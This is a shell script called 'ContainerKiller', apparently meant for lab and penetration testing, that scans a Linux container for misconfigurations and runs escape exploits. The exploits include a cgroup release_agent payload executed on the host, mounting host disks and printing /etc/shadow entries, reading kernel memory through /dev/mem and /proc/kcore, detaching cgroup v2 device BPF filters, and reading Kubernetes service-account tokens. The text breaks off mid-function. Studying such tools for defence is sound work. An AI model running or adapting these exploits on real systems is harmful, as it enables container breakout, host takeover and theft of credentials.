#!/bin/sh
# ContainerKiller — Shell Edition
# Upload into ANY container. Zero dependencies beyond /bin/sh.
# Usage: sh containerkiller.sh [scan|exploit [id]|list|all]

# ── Colors: disabled — plain text output ────────────────
R='' G='' Y='' B='' C='' M='' D='' BOLD='' W=''

# ── Banner ──────────────────────────────────────────────
banner() {
    printf "%s" "$R"
    printf "██████╗ ██████╗ ███╗   ██╗████████╗ █████╗ ██╗███╗   ██╗███████╗██████╗\n"
    printf "██╔════╝██╔═══██╗████╗  ██║╚══██╔══╝██╔══██╗██║████╗  ██║██╔════╝██╔══██╗\n"
    printf "██║     ██║   ██║██╔██╗ ██║   ██║   ███████║██║██╔██╗ ██║█████╗  ██████╔╝\n"
    printf "██║     ██║   ██║██║╚██╗██║   ██║   ██╔══██║██║██║╚██╗██║██╔══╝  ██╔══██╗\n"
    printf "╚██████╗╚██████╔╝██║ ╚████║   ██║   ██║  ██║██║██║ ╚████║███████╗██║  ██║\n"
    printf " ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝\n"
    printf "%s" "$D"
    printf "                                                ██╗  ██╗██╗██╗     ██╗     ███████╗██████╗\n"
    printf "                                                ██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗\n"
    printf "                                                █████╔╝ ██║██║     ██║     █████╗  ██████╔╝\n"
    printf "                                                ██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗\n"
    printf "                                                ██║  ██╗██║███████╗███████╗███████╗██║  ██║\n"
    printf "                                                ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝\n"
    printf "%s" "$R"
    printf "                                                           by slamo\n"
    printf "                                        \"Break the container. Claim the real treasure.\"\n"
    printf "%s\n" "$W"
}

# ── Helpers ─────────────────────────────────────────────
info()  { printf "  ${B}[*]${W} %s\n" "$1"; }
ok()    { printf "  ${G}[+]${W} %s\n" "$1"; }
warn()  { printf "  ${Y}[!]${W} %s\n" "$1"; }
err()   { printf "  ${R}[-]${W} %s\n" "$1"; }
success(){ printf "  ${G}[SUCCESS]${W} %s\n" "$1"; }
failed(){ printf "  ${R}[FAILED]${W} %s\n" "$1"; }

# ── Escape contract: proof markers ──────────────────────
# Every real escape follows: Detect → Exploit (write unique marker on host)
# → Verify (marker readable back, and NOT visible from the container side)
# → Restore (delete marker). No leftover host state, no false positives.
ck_marker() { echo "ck_$$_$(date +%s)"; }

# True only if the marker landed on the HOST (not in our own namespace):
#  - our own /tmp must NOT contain the marker,
#  - nsenter must read it back,
#  - nsenter must be in a DIFFERENT mount namespace than ours
#    (hostname alone is unreliable: hostNetwork pods share the node hostname).
ck_nsenter_verify() {
    m="$1"
    [ ! -f "/tmp/$m" ] || return 1
    [ "$(nsenter -t 1 -a -- cat "/tmp/$m" 2>/dev/null)" = "CK-ESCAPE-PROOF" ] || return 1
    self_mnt=$(readlink /proc/self/ns/mnt 2>/dev/null)
    host_mnt=$(nsenter -t 1 -a -- readlink /proc/self/ns/mnt 2>/dev/null)
    [ -n "$host_mnt" ] && [ "$host_mnt" != "$self_mnt" ]
}

ck_nsenter_marker() {
    m="$1"
    nsenter -t 1 -a -- sh -c "echo CK-ESCAPE-PROOF > /tmp/$m && hostname > /tmp/$m.hn && id > /tmp/$m.id" 2>/dev/null
}

ck_nsenter_cleanup() {
    m="$1"
    nsenter -t 1 -a -- rm -f "/tmp/$m" "/tmp/$m.hn" "/tmp/$m.id" 2>/dev/null
}

ck_mount_marker() {
    m="$1"; mp="$2"
    echo "CK-ESCAPE-PROOF" > "$mp/tmp/$m" 2>/dev/null
    # Real host hostname, read through the host root mount (not our own).
    (cat "$mp/etc/hostname" 2>/dev/null || hostname) > "$mp/tmp/$m.hn" 2>/dev/null
}

ck_mount_verify() {
    m="$1"; mp="$2"
    [ "$(cat "$mp/tmp/$m" 2>/dev/null)" = "CK-ESCAPE-PROOF" ]
}

ck_mount_cleanup() {
    m="$1"; mp="$2"
    rm -f "$mp/tmp/$m" "$mp/tmp/$m.hn" "$mp/tmp/$m.id" 2>/dev/null
}

has_cap() {
    # $1 = capability name (e.g. sys_admin)
    cap="$1"
    bit=0
    case "$cap" in
        chown)                bit=0 ;;  dac_override)      bit=1 ;;
        dac_read_search)      bit=2 ;;  fowner)             bit=3 ;;
        fsetid)               bit=4 ;;  kill)               bit=5 ;;
        setgid)               bit=6 ;;  setuid)             bit=7 ;;
        setpcap)              bit=8 ;;  linux_immutable)    bit=9 ;;
        net_bind_service)    bit=10 ;;  net_broadcast)     bit=11 ;;
        net_admin)           bit=12 ;;  net_raw)           bit=13 ;;
        ipc_lock)            bit=14 ;;  ipc_owner)         bit=15 ;;
        sys_module)          bit=16 ;;  sys_rawio)         bit=17 ;;
        sys_chroot)          bit=18 ;;  sys_ptrace)        bit=19 ;;
        sys_pacct)           bit=20 ;;  sys_admin)         bit=21 ;;
        sys_boot)            bit=22 ;;  sys_nice)          bit=23 ;;
        sys_resource)        bit=24 ;;  sys_time)          bit=25 ;;
        sys_tty_config)      bit=26 ;;  mknod)             bit=27 ;;
        lease)               bit=28 ;;  audit_write)       bit=29 ;;
        audit_control)       bit=30 ;;  setfcap)           bit=31 ;;
        mac_override)        bit=32 ;;  mac_admin)         bit=33 ;;
        syslog)              bit=34 ;;  wake_alarm)        bit=35 ;;
        block_suspend)       bit=36 ;;  audit_read)        bit=37 ;;
        perfmon)             bit=38 ;;  bpf)               bit=39 ;;
        checkpoint_restore)  bit=40 ;;
        *) return 1 ;;
    esac
    # cap_eff is a hex string set by scan_env
    val=$((cap_eff_val))
    test $(( (val >> bit) & 1 )) -eq 1
}

has_cmd() { command -v "$1" >/dev/null 2>&1; }

# ── Scan Environment ────────────────────────────────────
scan_env() {
    # --- Container identity ---
    container_id=$(cat /etc/hostname 2>/dev/null | cut -c1-12)
    kernel_ver=$(uname -r 2>/dev/null)
    uname_full=$(uname -a 2>/dev/null)

    # --- Capabilities ---
    cap_eff_val=0
    cap_list=""
    line=$(grep '^CapEff:' /proc/self/status 2>/dev/null)
    if [ -n "$line" ]; then
        cap_eff_hex=$(echo "$line" | awk '{print $2}')
        cap_eff_val=$(printf "%d" "0x${cap_eff_hex}" 2>/dev/null || echo 0)
        # Decode: loop over all known caps
        cap_list=""
        for cap in chown dac_override dac_read_search fowner fsetid kill setgid setuid setpcap linux_immutable net_bind_service net_broadcast net_admin net_raw ipc_lock ipc_owner sys_module sys_rawio sys_chroot sys_ptrace sys_pacct sys_admin sys_boot sys_nice sys_resource sys_time sys_tty_config mknod lease audit_write audit_control setfcap mac_override mac_admin syslog wake_alarm block_suspend audit_read perfmon bpf checkpoint_restore; do
            if has_cap "$cap"; then
                cap_list="$cap_list $cap"
            fi
        done
        cap_list=$(echo "$cap_list" | sed 's/^ //')
    fi

    # Privileged check: compare CapEff hex against known full masks
    # (avoid 64-bit arithmetic overflow in POSIX shell)
    is_privileged=0
    cap_eff_hex_raw=$(grep '^CapEff:' /proc/self/status 2>/dev/null | awk '{print $2}' | tr '[:upper:]' '[:lower:]')
    # Strip leading zeros for comparison
    cap_eff_hex_clean=$(echo "$cap_eff_hex_raw" | sed 's/^0*//')
    # Known full capability masks
    if [ "$cap_eff_hex_clean" = "3fffffffff" ] || [ "$cap_eff_hex_clean" = "1ffffffffff" ]; then
        is_privileged=1
    fi
    # Fallback: if has 5+ critical caps simultaneously
    if [ "$is_privileged" = "0" ]; then
        crit_count=0
        has_cap sys_admin    && crit_count=$((crit_count+1))
        has_cap sys_module   && crit_count=$((crit_count+1))
        has_cap sys_ptrace   && crit_count=$((crit_count+1))
        has_cap net_admin    && crit_count=$((crit_count+1))
        has_cap sys_boot     && crit_count=$((crit_count+1))
        has_cap sys_rawio    && crit_count=$((crit_count+1))
        test "$crit_count" -ge 5 2>/dev/null && is_privileged=1
    fi

    # --- Cgroup version ---
    cgroup_version=0
    if [ -f /sys/fs/cgroup/cgroup.controllers ]; then
        cgroup_version=2
    elif mount 2>/dev/null | grep -q 'cgroup '; then
        cgroup_version=1
    elif grep -q 'tmpfs' /proc/mounts 2>/dev/null && grep -q 'cgroup' /proc/mounts 2>/dev/null; then
        cgroup_version=1
    fi

    # --- Seccomp ---
    seccomp=-1
    line=$(grep '^Seccomp:' /proc/self/status 2>/dev/null)
    if [ -n "$line" ]; then
        seccomp=$(echo "$line" | awk '{print $2}')
        case "$seccomp" in 0|1|2) ;; *) seccomp=-1 ;; esac
    fi

    # --- AppArmor ---
    apparmor=$(cat /proc/self/attr/current 2>/dev/null | tr -d '\n')

    # --- LSMs (Linux Security Modules) ---
    lsm_list=$(cat /sys/kernel/security/lsm 2>/dev/null | tr -d '\n')
    lsm_enabled=0
    echo "$lsm_list" | grep -q smack    && smack=1 || smack=0
    echo "$lsm_list" | grep -q tomoyo   && tomoyo=1 || tomoyo=0
    echo "$lsm_list" | grep -q yama     && yama=1 || yama=0
    echo "$lsm_list" | grep -q landlock && landlock=1 || landlock=0
    test -n "$lsm_list" && lsm_enabled=1
    yama_scope=$(cat /sys/module/yama/parameters/ptrace_scope 2>/dev/null)
    test -z "$yama_scope" && yama_scope=$(cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null)
    test -z "$yama_scope" && yama_scope="n/a"

    # --- User namespace ---
    uid_map=$(head -1 /proc/self/uid_map 2>/dev/null)
    userns=0
    if [ -n "$uid_map" ] && ! echo "$uid_map" | grep -q '^\s*0\s*0\s*4294967295'; then
        userns=1
    fi

    # --- Protections (what's enforced) ---
    no_new_privs=0
    grep -q '^NoNewPrivs:	1' /proc/self/status 2>/dev/null && no_new_privs=1
    root_ro=0
    awk '$2=="/" && $4 ~ /(^|,)ro(,|$)/ {print}' /proc/mounts 2>/dev/null | grep -q . && root_ro=1
    kptr_restrict=$(cat /proc/sys/kernel/kptr_restrict 2>/dev/null); test -z "$kptr_restrict" && kptr_restrict="?"
    dmesg_restrict=$(cat /proc/sys/kernel/dmesg_restrict 2>/dev/null); test -z "$dmesg_restrict" && dmesg_restrict="?"
    unpriv_userns=$(cat /proc/sys/kernel/unprivileged_userns_clone 2>/dev/null); test -z "$unpriv_userns" && unpriv_userns=$(cat /proc/sys/user/max_user_namespaces 2>/dev/null); test -z "$unpriv_userns" && unpriv_userns="?"
    selinux_mode=disabled
    has_cmd getenforce && selinux_mode=$(getenforce 2>/dev/null); test -z "$selinux_mode" && selinux_mode=disabled

    # --- Docker socket ---
    docker_socket=0
    test -e /var/run/docker.sock && docker_socket=1

    # --- Host PID detection ---
    host_pid=0
    # Reliable check: count total processes visible. In a container
    # without --pid=host, you see ~5-20 PIDs. With host PID, 150+
    proc_count=$(ls -1d /proc/[0-9]* 2>/dev/null | wc -l)
    if [ "$proc_count" -gt 100 ] 2>/dev/null; then
        host_pid=1
    fi
    # Also check /proc/1/cmdline: host init vs container entrypoint
    pid1_cmd=$(tr '\0' ' ' < /proc/1/cmdline 2>/dev/null)
    case "$pid1_cmd" in
        *systemd*|*init*|*sbin/init*)
            host_pid=1 ;;
    esac

    # --- Host network detection ---
    # A container in its own netns sees ~2 interfaces (lo + eth0). Sharing the
    # host netns reveals all host interfaces (eth0 + docker0/br-*/virbr/veths).
    host_network=0
    net_iface_count=$(ls -1 /sys/class/net 2>/dev/null | wc -l)
    if [ "${net_iface_count:-0}" -gt 2 ] 2>/dev/null; then
        host_network=1
    fi

    # --- Mounts ---
    host_root_mounted=0
    for mp in /host /mnt /run/host; do
        test -e "$mp/etc/hostname" 2>/dev/null && host_root_mounted=1 && break
    done

    test -e /host/etc/shadow 2>/dev/null && host_root_mounted=1

    # --- proc/sys writable checks ---
    # Candidate paths include common escape-lab mounts (/host/proc, /host/sys,
    # /mnt/proc, /mnt/sys, /run/host/proc) so labs that mount procfs/sysfs at a
    # non-default path are still detected. We also record WHERE we found the
    # writable handle so the exploit uses the exact same path.
    core_pattern_writable=0
    core_full_path=""
    for cp in /proc/sys/kernel/core_pattern /host/proc/sys/kernel/core_pattern \
              /mnt/proc/sys/kernel/core_pattern /run/host/proc/sys/kernel/core_pattern \
              /hostroot/proc/sys/kernel/core_pattern; do
        if [ -w "$cp" ] 2>/dev/null; then
            core_pattern_writable=1
            core_full_path="$cp"
            break
        fi
    done
    core_pattern=$(cat "${core_full_path:-/proc/sys/kernel/core_pattern}" 2>/dev/null)

    uevent_helper_writable=0
    uevent_full_path=""
    for uh in /sys/kernel/uevent_helper /host/sys/kernel/uevent_helper \
              /mnt/sys/kernel/uevent_helper /run/host/sys/kernel/uevent_helper \
              /hostroot/sys/kernel/uevent_helper; do
        if [ -w "$uh" ] 2>/dev/null; then
            uevent_helper_writable=1
            uevent_full_path="$uh"
            break
        fi
    done

    sysrq_writable=0
    sysrq_full_path=""
    for st in /proc/sysrq-trigger /host/proc/sysrq-trigger /mnt/proc/sysrq-trigger \
              /hostroot/proc/sysrq-trigger; do
        if [ -w "$st" ] 2>/dev/null; then
            sysrq_writable=1
            sysrq_full_path="$st"
            break
        fi
    done

    # --- /proc/1/root accessibility (distinct from host_pid) ---
    # host_pid == visible namespaces; this is whether we can actually traverse
    # into host init's root (blocks when yama ptrace_scope forbids remote reads)
    proc1_root_access=0
    test -r /proc/1/root/etc/passwd 2>/dev/null && proc1_root_access=1
    if [ "$proc1_root_access" = "0" ]; then
        ls /proc/1/root/ >/dev/null 2>&1 && proc1_root_access=1
    fi

    # --- Devices ---
    has_sda=0;       test -e /dev/sda && has_sda=1
    has_nvme=0;      test -e /dev/nvme0n1 && has_nvme=1
    has_vda=0;       test -e /dev/vda && has_vda=1
    has_dev_mem=0;   test -e /dev/mem && has_dev_mem=1
    any_blkdev=0;    test "$has_sda" = "1" || test "$has_nvme" = "1" || test "$has_vda" = "1" && any_blkdev=1

    # --- Kubernetes ---
    k8s_token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
    k8s_namespace=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)
    k8s_ca=0; test -e /var/run/secrets/kubernetes.io/serviceaccount/ca.crt && k8s_ca=1
    k8s_api=$(printenv KUBERNETES_SERVICE_HOST 2>/dev/null)
    in_k8s=0
    test -n "$k8s_token" -o -n "$k8s_api" && in_k8s=1

    # --- Cloud metadata ---
    # --- Binaries ---
    has_wget=$(has_cmd wget && echo 1 || echo 0)
    has_nsenter=$(has_cmd nsenter && echo 1 || echo 0)
    has_gcc=$(has_cmd gcc && echo 1 || echo 0)
    has_make=$(has_cmd make && echo 1 || echo 0)
    has_kubectl=$(has_cmd kubectl && echo 1 || echo 0)
    has_unshare=$(has_cmd unshare && echo 1 || echo 0)
    has_ip=$(has_cmd ip && echo 1 || echo 0)
    has_mount=$(has_cmd mount && echo 1 || echo 0)
    has_kexec=$(has_cmd kexec && echo 1 || echo 0)
    has_nvidia=$(has_cmd nvidia-smi && echo 1 || echo 0)

    # --- Kernel version (intel for the tester) ---
    is_ubuntu=0
    echo "$uname_full" | grep -qi ubuntu && is_ubuntu=1

    # --- Runtime versions (INFORMATIONAL — CVEs not exploited by CK) ---
    runc_version="unknown"
    containerd_version="unknown"
    docker_version="unknown"
    runtime_name="unknown"
    if [ -e /proc/self/exe ]; then
        rv=$(/proc/self/exe --version 2>/dev/null | head -1)
        if echo "$rv" | grep -qi runc; then runtime_name="runc"; runc_version="$rv"; fi
    fi
    if [ "$runtime_name" = "unknown" ] && has_cmd runc; then
        rv=$(runc --version 2>/dev/null | head -1)
        echo "$rv" | grep -qi runc && { runtime_name="runc"; runc_version="$rv"; }
    fi
    if [ "$runtime_name" = "unknown" ] && has_cmd containerd; then
        cv=$(containerd --version 2>/dev/null | head -1)
        [ -n "$cv" ] && { runtime_name="containerd"; containerd_version="$cv"; }
    fi
    if [ "$runtime_name" = "unknown" ] && has_cmd docker; then
        dv=$(docker --version 2>/dev/null | head -1)
        [ -n "$dv" ] && { runtime_name="docker"; docker_version="$dv"; }
    fi
    if [ "$runtime_name" = "unknown" ] && [ -e /proc/1/exe ]; then
        p1=$(readlink /proc/1/exe 2>/dev/null)
        case "$p1" in
            *containerd*) containerd_version="v1.x (path: $p1)" ;;
            *runc*) runc_version="present (path: $p1)" ;;
        esac
        [ "$p1" != "$p1_prev" ] && true
    fi
}

# ══════════════════════════════════════════════════════════
# EXPLOIT TECHNIQUES
# ══════════════════════════════════════════════════════════
# Each function returns: 0 on success + message on stdout
#                        stdout is captured for output

# ── 1. RUNTIME MISCONFIGURATION ────────────────────────

exploit_1_1() {
    # Cgroup release agent (v1 only)
    if [ "$cgroup_version" != "1" ]; then
        echo "Cgroup v2 detected — release_agent is v1 only. Skipping 1.1."
        return 2
    fi
    cg="/tmp/cg_$$"
    mkdir -p "$cg" 2>/dev/null
    mounted=0
    for ctl in memory devices freezer pids "cpu,cpuacct" blkio systemd; do
        mount -t cgroup -o "$ctl" cgroup "$cg" 2>/dev/null && { mounted=1; break; }
    done
    if [ "$mounted" = "0" ]; then
        mount --bind /sys/fs/cgroup "$cg" 2>/dev/null && mounted=1
    fi
    if [ "$mounted" = "0" ]; then
        echo "Cannot mount cgroup controller"
        return 1
    fi
    mkdir -p "$cg/x" 2>/dev/null
    echo 1 > "$cg/x/notify_on_release" 2>/dev/null
    hp="/"
    payload_host="${hp}/ck_payload"
    echo "$payload_host" > "$cg/release_agent" 2>/dev/null

    # release_agent executes on the HOST (init mount ns). The payload must
    # write its proof marker back into the overlay upperdir so the container
    # can read it back at /ck_pwned — a container-side /tmp check alone would
    # always be a false negative.
    cat > /ck_payload << EOF
#!/bin/sh
id > ${hp}/ck_pwned 2>/dev/null
hostname >> ${hp}/ck_pwned 2>/dev/null
id > /tmp/ck_pwned 2>/dev/null
EOF
    chmod +x /ck_payload 2>/dev/null

    sh -c "echo \$\$ > $cg/x/cgroup.procs" 2>/dev/null
    sleep 1
    if [ -f /ck_pwned ] || [ -f /tmp/ck_pwned ]; then
        pwned=$(cat /ck_pwned /tmp/ck_pwned 2>/dev/null | head -1)
        rm -rf "$cg" /ck_payload /ck_pwned 2>/dev/null
        echo "Escape successful! Host: $pwned"
        return 0
    fi
    rm -rf "$cg" /ck_payload /ck_pwned 2>/dev/null
    echo "release_agent set but payload did not execute on host (need cgroup v1 + host-visible payload path)"
    return 1
}

exploit_1_2() {
    # Device breakout — try mounting every host block device read-only
    mp="/mnt/host_$$"
    mkdir -p "$mp" 2>/dev/null
    devs=""
    for d in /dev/sda* /dev/sdb* /dev/sdc* /dev/vda* /dev/vdb* /dev/nvme0n1* /dev/nvme1n1* /dev/xda* /dev/dm-*; do
        [ -e "$d" ] && devs="$devs $d"
    done
    for d in $devs; do
        mount -o ro "$d" "$mp" 2>/dev/null || mount "$d" "$mp" 2>/dev/null || continue
        if [ -f "$mp/etc/shadow" ]; then
            shadow=$(head -2 "$mp/etc/shadow" 2>/dev/null)
            echo "Host filesystem found via $d. shadow: ${shadow}"
            umount "$mp" 2>/dev/null; rmdir "$mp" 2>/dev/null
            return 0
        fi
        if [ -f "$mp/etc/passwd" ]; then
            echo "Host filesystem found via $d (no shadow readable)"
            umount "$mp" 2>/dev/null; rmdir "$mp" 2>/dev/null
            return 0
        fi
        umount "$mp" 2>/dev/null
    done
    rmdir "$mp" 2>/dev/null
    echo "No host root partition mountable"
    return 1
}

exploit_1_3() {
    if [ "$has_dev_mem" != "1" ]; then
        echo "/dev/mem not present"
        return 1
    fi
    if ! has_cmd dd; then
        echo "/dev/mem present but dd unavailable"
        return 1
    fi
    # Actual kernel location from /proc/iomem (handles KASLR); fallback x86_64 0x1000000
    koff=$(grep -m1 "Kernel code" /proc/iomem 2>/dev/null | awk '{print $1}' | cut -d- -f1)
    case "$koff" in ""|00000000|0x0) koff="1000000" ;; esac
    skip=$(( 0x${koff} / 4096 ))
    # Probe: is the kernel region readable at all?
    probe=$(dd if=/dev/mem bs=4096 skip=$skip count=4 2>/dev/null | wc -c)
    if [ "$probe" = "0" ]; then
        # STRICT_DEVMEM blocks the kernel region; check the low 0-1MiB is readable at all
        # (byte count, not grep: all-zero regions defeat grep -q, NUL = record separator)
        if [ "$(dd if=/dev/mem bs=4096 skip=16 count=16 2>/dev/null | wc -c)" -gt 0 ]; then
            echo "/dev/mem present + low region readable but kernel region (0x${koff}) blocked (CONFIG_STRICT_DEVMEM=y)"
        else
            echo "/dev/mem present but reads blocked"
        fi
        # Fallback: /proc/kcore route (works when Docker does NOT mask it —
        # privileged containers run AppArmor 'unconfined', so no LSM deny)
        if [ -r /proc/kcore ]; then
            if dd if=/proc/kcore bs=4 count=1 2>/dev/null | od -An -t x1 2>/dev/null | grep -q "7f 45 4c 46"; then
                kver=$(exploit_1_3_kcore_version)
                if [ -n "$kver" ]; then
                    echo "/proc/kcore readable: kernel memory READ (kernel image segment):"
                    echo "    $kver"
                    return 0
                fi
                echo "/proc/kcore readable (ELF) but kernel version string not found"
                return 0
            fi
            echo "/proc/kcore present but masked (empty) — kernel memory NOT readable"
        fi
        return 1
    fi
    # Kernel region readable: full dump + look for the version string (stronger proof)
    if has_cmd strings; then
        out=$(dd if=/dev/mem bs=4096 skip=$skip count=4096 2>/dev/null | strings 2>/dev/null | grep -m1 "^Linux version")
    else
        out=$(dd if=/dev/mem bs=4096 skip=$skip count=4096 2>/dev/null | grep -am1 "Linux version" | cut -c1-90)
    fi
    echo "Kernel memory READ via /dev/mem at physical 0x${koff}: dump OK"
    if [ -n "$out" ]; then
        echo "$out"
    else
        echo "    (no 'Linux version' string found — raw dump proof only)"
    fi
    return 0
}

# Lab 1.4 — cgroup v2: détach du contrôleur devices eBPF (BPF_CGROUP_DEVICE).
# Miroir exact du README/exploit.sh du lab : sonde EPERM, détach canonique,
# lecture, restore fail-closed. L'outil de détach (cgroup_bpf) est compilé sur
# l'hôte et copié dans le conteneur (même chaîne que les labs 2.2/1.3).
# exit 0 = évasion prouvée, 2 = SKIPPED (outil absent), 1 = non applicable/échec.
exploit_1_4() {
    if [ "$cgroup_version" != "2" ]; then
        echo "cgroup v1 détecté — technique spécifique à cgroup v2"
        return 1
    fi
    MAJMIN=$(echo "${TARGET_MAJMIN:-}" | tr -d '[:space:]')
    if [ -z "$MAJMIN" ]; then
        MAJMIN=$(awk '$4=="nvme0n1"||$4=="sda"||$4=="vda"{print $1":"$2; exit}' /proc/partitions 2>/dev/null)
    fi
    if [ -z "$MAJMIN" ]; then
        echo "aucun disque hôte visible dans /proc/partitions"
        return 1
    fi
    if ! has_cmd dd; then
        echo "dd indisponible"
        return 1
    fi
    rm -f /tmp/ck_probe_dev
    if ! mknod /tmp/ck_probe_dev b "${MAJMIN%:*}" "${MAJMIN#*:}" 2>/dev/null; then
        echo "mknod refusé (CAP_MKNOD manquante)"
        return 1
    fi
    if dd if=/tmp/ck_probe_dev of=/dev/null bs=512 count=1 2>/dev/null; then
        rm -f /tmp/ck_probe_dev
        echo "disque ${MAJMIN} déjà lisible — contrôleur devices non appliqué"
        return 1
    fi
    echo "contrôleur devices eBPF actif (lecture EPERM sur ${MAJMIN})"
    if [ ! -x /tmp/cgroup_bpf ]; then
        rm -f /tmp/ck_probe_dev
        echo "outil /tmp/cgroup_bpf absent — compile cgroup_bpf.c sur l'hôte,"
        echo "    puis : docker cp cgroup_bpf <conteneur>:/tmp/cgroup_bpf"
        return 2
    fi
    if ! /tmp/cgroup_bpf detach /sys/fs/cgroup 2>&1; then
        rm -f /tmp/ck_probe_dev
        echo "detach échoué (les caps requises ne suffisent pas ?)"
        return 1
    fi
    if dd if=/tmp/ck_probe_dev of=/dev/null bs=512 count=1 2>/dev/null; then
        echo "ÉVASION : disque hôte lisible après détach des programmes BPF_CGROUP_DEVICE"
        if ! /tmp/cgroup_bpf restore /sys/fs/cgroup 2>&1; then
            echo "[!] RESTORE INCOMPLET — docker compose restart pour remettre la"
            echo "    politique devices (le runtime ré-attache ses programmes au boot)"
        fi
        rm -f /tmp/ck_probe_dev
        return 0
    fi
    /tmp/cgroup_bpf restore /sys/fs/cgroup 2>&1 \
        || echo "[!] RESTORE INCOMPLET — docker compose restart recommandé"
    rm -f /tmp/ck_probe_dev
    echo "détach sans effet sur l'accès au disque"
    return 1
}
# /proc/kcore: parse the ELF program headers, find the kernel image segment
# (the one <= 256 MiB containing "Linux version" — linux_banner in .rodata).
# The direct map / vmemmap segments are huge; they are skipped.
exploit_1_3_kcore_version() {
    local phoff phentsz phnum i off type p_off p_mem cnt
    phoff=$(dd if=/proc/kcore bs=1 skip=32 count=8 2>/dev/null | od -An -v -t u8 | tr -d " ")
    phentsz=$(dd if=/proc/kcore bs=1 skip=54 count=2 2>/dev/null | od -An -v -t u2 | tr -d " ")
    phnum=$(dd if=/proc/kcore bs=1 skip=56 count=2 2>/dev/null | od -An -v -t u2 | tr -d " ")
    [ -z "$phnum" ] || [ "$phnum" = "0" ] && return 1
    i=0
    while [ "$i" -lt "$phnum" ]; do
        off=$(( phoff + i*phentsz ))
        type=$(dd if=/proc/kcore bs=1 skip=$off count=4 2>/dev/null | od -An -v -t u4 | tr -d " ")
        if [ "$type" = "1" ]; then
            p_off=$(dd if=/proc/kcore bs=1 skip=$((off+8)) count=8 2>/dev/null | od -An -v -t u8 | tr -d " ")
            p_mem=$(dd if=/proc/kcore bs=1 skip=$((off+40)) count=8 2>/dev/null | od -An -v -t u8 | tr -d " ")
            if [ "$p_mem" -le 268435456 ]; then   # skip direct map / vmemmap
                if [ $(( p_mem/4096 )) -lt 16384 ]; then cnt=$(( p_mem/4096 )); else cnt=16384; fi
                if dd if=/proc/kcore bs=4096 skip=$(( p_off/4096 )) count=$cnt 2>/dev/null \
                   | grep -a -m1 -o "Linux version.\{0,90\}"; then
                    return 0
                fi
            fi
        fi
        i=$((i+1))
    done
    return 1
}

# ── 2. CAPABILITIES ────────────────────────────────────

exploit_2_1() {
    # CAP_SYS_ADMIN — mount propagation via rshared volumes
    if has_cap sys_module && [ "$cgroup_version" = "1" ]; then
        echo "CAP_SYS_MODULE available: load kernel module. mount/cgroup/pivot_root also possible"
        return 0
    fi
    if [ "$any_blkdev" = "1" ]; then
        exploit_1_2
        return $?
    fi
    # Test mount propagation: check for rshared host bind mount
    for mp in /hostroot /host; do
        if mountpoint -q "$mp" 2>/dev/null; then
            prop=$(findmnt -no PROPAGATION "$mp" 2>/dev/null)
            case "$prop" in
                shared*) echo "SYS_ADMIN + rshared mount propagation at $mp: mounts propagate bidirectionally"; return 0 ;;
                *) echo "SYS_ADMIN: $mp mounted (propagation=${prop:-none}). Not shared — no bidirectional escape"; return 0 ;;
            esac
        fi
    done
    if [ "$host_root_mounted" = "1" ]; then
        echo "SYS_ADMIN: host root mounted. Use mount --bind for filesystem access"
        return 0
    fi
    echo "CAP_SYS_ADMIN: mount, cgroup, nsenter, unshare available"
    return 0
}

exploit_2_2() {
    if ! has_cap sys_ptrace; then
        echo "CAP_SYS_PTRACE missing"
        return 1
    fi
    if [ "$host_pid" != "1" ]; then
        echo "SYS_PTRACE available but need --pid=host"
        return 1
    fi
    echo "CAP_SYS_PTRACE + host PID: ptrace injection possible. Use: cat /proc/1/mem"
    return 0
}

exploit_2_3() {
    if ! has_cap sys_module; then
        echo "CAP_SYS_MODULE missing"
        return 1
    fi
    if [ ! -d /lib/modules ]; then
        echo "No kernel headers in container. Cannot compile LKM."
        return 1
    fi
    echo "CAP_SYS_MODULE: kernel module loading possible. Compile LKM with gcc then insmod"
    return 0
}

exploit_2_4() {
    if ! has_cap net_admin; then
        echo "CAP_NET_ADMIN missing"
        return 1
    fi
    if [ "$host_network" = "1" ]; then
        has_cmd iptables && { echo "NET_ADMIN + host network: host iptables accessible (NAT, MITM, redirect)"; return 0; }
        has_cmd ip && { echo "NET_ADMIN + host network: ip command available (TUN/TAP, routes on host)"; return 0; }
        echo "NET_ADMIN + host network: host-level network control"
        return 0
    fi
    has_cmd iptables && { echo "iptables accessible (container namespace only — not host)"; return 0; }
    has_cmd ip && { echo "ip command available (container namespace only — not host)"; return 0; }
    echo "CAP_NET_ADMIN available (container namespace only — scope limited)"
    return 0
}

exploit_2_7() {
    has_cap sys_rawio || { echo "CAP_SYS_RAWIO missing"; return 1; }
    # SYS_RAWIO grants iopl()/ioperm() for I/O port access.
    # /dev/mem and /dev/port require CAP_SYS_ADMIN, not RAWIO.
    for tool in inb outb; do
        has_cmd "$tool" && { echo "I/O port access ready (${tool} available). Use: outb 0x00 0x70 && inb 0x71"; return 0; }
    done
    # Try iopl() callability as fallback proof
    python3 -c "import ctypes; ctypes.CDLL('libc.so.6').iopl(3)" 2>/dev/null && { echo "SYS_RAWIO: iopl() accessible — I/O port operations enabled"; return 0; }
    echo "CAP_SYS_RAWIO present but no inb/outb tooling. Install ioport package"
    return 1
}

exploit_2_8() {
    has_cap sys_boot || { echo "CAP_SYS_BOOT missing"; return 1; }
    # Check kernel-level barriers before reporting exploitability
    kexec_disabled=$(cat /proc/sys/kernel/kexec_load_disabled 2>/dev/null)
    [ "$kexec_disabled" = "1" ] && { echo "CAP_SYS_BOOT present but kexec_load_disabled=1 — kernel blocks kexec"; return 1; }
    lockdown=$(cat /sys/kernel/security/lockdown 2>/dev/null)
    [ -n "$lockdown" ] && [ "$lockdown" != "[none]" ] && { echo "CAP_SYS_BOOT present but kernel lockdown=${lockdown} — kexec restricted"; return 1; }
    has_cmd kexec && { echo "CAP_SYS_BOOT: kexec available — can load kernel. Use: kexec -l /boot/vmlinuz --reuse-cmdline"; return 0; }
    echo "CAP_SYS_BOOT present but kexec not found. Install kexec-tools"
    return 1
}

exploit_2_9() {
    has_cap dac_read_search || { echo "CAP_DAC_READ_SEARCH missing"; return 1; }
    echo "Bypass directory read/search permissions. Can read any file in restricted dirs"
    return 0
